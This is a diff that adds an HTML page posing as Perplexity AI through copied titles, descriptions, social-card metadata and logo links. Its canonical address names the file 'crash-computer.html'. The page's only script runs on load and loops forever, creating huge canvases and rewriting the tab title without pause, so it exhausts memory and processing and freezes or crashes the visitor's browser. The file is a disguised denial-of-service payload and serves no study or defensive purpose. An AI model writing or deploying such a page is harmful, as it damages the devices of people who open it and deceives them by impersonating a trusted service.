@@ -1,0 +1,73 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Standard SEO Meta Tags (Good Practice) -->
+    <title>Perplexity AI</title>
+    <!--
+    <meta name="description" content="The AI answer engine. Ask anything and get an instant, reliable answer backed by sources.">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://redhorse26.github.io/crash-computer.html">
+    -->
+    <!-- Open Graph Meta Tags (for Facebook, LinkedIn, Google Chat, etc.) -->
+    <!--
+    <meta property="og:title" content="Perplexity AI">
+    <meta property="og:description" content="The AI answer engine. Ask anything and get an instant, reliable answer backed by sources.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1d/Perplexity_AI_logo.svg/2880px-Perplexity_AI_logo.svg.png?20230820074314">
+    <meta property="og:url" content="https://redhorse26.github.io/crash-computer.html">
+    <meta property="og:site_name" content="Perplexity AI">
+    <meta property="og:type" content="website">
+    -->
+    <meta name="version" content="6fa64db">
+    <meta name="min-version" content="1760204558945">
+    <meta charset="utf-8">
+    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#FCFCF9">
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#100E12">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="canonical" href="https://redhorse26.github.io/crash-computer.html">
+    <meta name="description" content="Perplexity is a free AI-powered answer engine that provides accurate, trusted, and real-time answers to any question.">
+    <meta property="og:title" content="Perplexity">
+    <meta property="og:description" content="Perplexity is a free AI-powered answer engine that provides accurate, trusted, and real-time answers to any question.">
+    <meta property="og:url" content="https://redhorse26.github.io/crash-computer.html">
+    <meta property="og:site_name" content="Perplexity AI">
+    <meta property="og:image" content="https://ppl-ai-public.s3.amazonaws.com/static/img/pplx-default-preview.png">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@perplexity_ai">
+    <meta name="twitter:title" content="Perplexity">
+    <meta name="twitter:description" content="Perplexity is a free AI-powered answer engine that provides accurate, trusted, and real-time answers to any question.">
+    <meta name="twitter:image" content="https://ppl-ai-public.s3.amazonaws.com/static/img/pplx-default-preview.png">
+</head>
+<body>
+  <script>
+        const hashes = [];
+        for (let i = 0; i < 100; i++) {
+            let hash = '';
+            for (let j = 0; j < 512; j++) {
+                hash += Math.floor(Math.random() * 16).toString(16);
+            }
+            hashes.push(hash);
+        }
+        let counter = 0;
+        const canvases = [];
+        while(true) {
+            const c = document.createElement('canvas');
+            c.width = 10000;
+            c.height = 10000;
+            const ctx = c.getContext('2d');
+            ctx.fillRect(0, 0, 10000, 10000);
+            canvases.push(c);
+            document.body.appendChild(c);
+            for (let i = 0; i < 8000; i++) {
+                document.title = hashes[counter % 100];
+                document.title = hashes[(counter + 1) % 100];
+                document.title = hashes[(counter + 2) % 100];
+                counter += 3;
+            }
+        }
+
+  </script>
+</body>
+</html>
